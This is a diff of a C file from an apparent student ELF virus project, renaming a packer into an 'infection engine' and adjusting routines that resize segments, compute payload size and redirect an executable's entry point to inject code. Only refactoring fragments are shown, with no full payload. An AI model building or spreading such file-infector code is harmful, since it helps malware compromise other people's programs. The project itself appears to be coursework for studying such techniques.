@@ -1,20 +1,19 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   packer.c                                           :+:      :+:    :+:   */
+/*   infection_engine.c                                 :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/21 00:37:31 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/22 23:03:06 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "famine.h"
-#include "infect.h"
 #include "errors.h"
+#include "virus.h"
 
-static bool	change_entry(const struct safe_pointer info, const struct entry *original_entry)
+static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry)
 {
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
@@ -36,7 +35,7 @@ static bool	change_entry(const struct safe_pointer info, const struct entry *ori
 
 static bool	adjust_sizes(size_t shift_amount, const struct entry *clone_entry)
 {
-	const size_t	payload_size = _start - famine_entry;
+	const size_t	payload_size = _start - loader_entry;
 
 	size_t		sh_size  = (clone_entry->safe_last_section_shdr->sh_size);
 	Elf64_Xword	p_filesz = (clone_entry->safe_phdr->p_filesz);
@@ -58,7 +57,7 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	const size_t	p_filesz        = (original_entry->safe_phdr->p_filesz);
 	const size_t	p_offset        = (original_entry->safe_phdr->p_offset);
 	const size_t	segment_end     = p_offset + p_filesz;
-	const size_t	payload_size    = _start - famine_entry;
+	const size_t	payload_size    = _start - loader_entry;
 	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;
 
 	if (payload_size < segment_padding)
@@ -70,7 +69,7 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	const size_t	p_memsz = (original_entry->safe_phdr->p_memsz);
 	const size_t	p_align = (original_entry->safe_phdr->p_align);
 
-	*shift_amount = ALIGN(payload_size, SHIFT_ALIGNMENT);
+	*shift_amount = ALIGN(payload_size, PAGE_ALIGNMENT);
 
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
@@ -80,7 +79,7 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	return true;
 }
 
-bool		get_client_id(uint64_t *client_id, const struct safe_pointer info)
+bool		get_client_id(uint64_t *client_id, struct safe_ptr ref)
 {
 	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));
 	if (elf_hdr == NULL)
@@ -89,7 +88,7 @@ bool		get_client_id(uint64_t *client_id, const struct safe_pointer info)
 	return true;
 }
 
-bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t seed[2])
+bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, uint64_t seed[2])
 {
 	struct entry	original_entry;
 	struct entry	clone_entry;
